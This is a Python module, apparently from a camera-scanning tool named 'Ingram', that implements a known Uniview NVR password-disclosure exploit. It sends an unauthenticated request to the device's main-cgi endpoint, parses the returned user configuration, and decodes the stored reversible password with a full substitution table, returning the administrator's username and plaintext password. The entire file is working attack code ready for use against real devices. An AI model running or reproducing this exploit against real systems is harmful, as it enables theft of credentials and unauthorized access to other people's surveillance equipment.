"""uniview NVR passwd disclosure
reference: https://www.exploit-db.com/exploits/42150
"""
import requests
from xml.etree import ElementTree

from Ingram.utils import config
from Ingram.utils import logger


def disclosure(ip: str) -> list:
    def passwd_decoder(passwd):
        code_table = {'77': '1', '78': '2', '79': '3', '72': '4', '73': '5', '74': '6', '75': '7', '68': '8', '69': '9',
                    '76': '0', '93': '!', '60': '@', '95': '#', '88': '$', '89': '%', '34': '^', '90': '&', '86': '*',
                    '84': '(', '85': ')', '81': '-', '35': '_', '65': '=', '87': '+', '83': '/', '32': '\\', '0': '|',
                    '80': ',', '70': ':', '71': ';', '7': '{', '1': '}', '82': '.', '67': '?', '64': '<', '66': '>',
                    '2': '~', '39': '[', '33': ']', '94': '"', '91': "'", '28': '`', '61': 'A', '62': 'B', '63': 'C',
                    '56': 'D', '57': 'E', '58': 'F', '59': 'G', '52': 'H', '53': 'I', '54': 'J', '55': 'K', '48': 'L',
                    '49': 'M', '50': 'N', '51': 'O', '44': 'P', '45': 'Q', '46': 'R', '47': 'S', '40': 'T', '41': 'U',
                    '42': 'V', '43': 'W', '36': 'X', '37': 'Y', '38': 'Z', '29': 'a', '30': 'b', '31': 'c', '24': 'd',
                    '25': 'e', '26': 'f', '27': 'g', '20': 'h', '21': 'i', '22': 'j', '23': 'k', '16': 'l', '17': 'm',
                    '18': 'n', '19': 'o', '12': 'p', '13': 'q', '14': 'r', '15': 's', '8': 't', '9': 'u', '10': 'v',
                    '11': 'w', '4': 'x', '5': 'y', '6': 'z'}
        decoded = []
        for char in passwd.split(';'):
            if char != "124" and char != "0": decoded.append(code_table[char])
        return ''.join(decoded)

    headers = {'Connection': 'close', 'User-Agent': config.USERAGENT}
    url = f"http://{ip}" + '/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}"'
    try:
        r = requests.get(url, headers=headers, verify=False, timeout=config.TIMEOUT)
        if r.status_code == 200 and r.text:
            tree = ElementTree.fromstring(r.text)
            items = tree.find('UserCfg')
            user, passwd = items[0].get('UserName'), passwd_decoder(items[0].get('RvsblePass'))
            return [True, user, passwd, 'uniview-disclosure']
    except Exception as e:
        logger.error(e)
    return [False, ]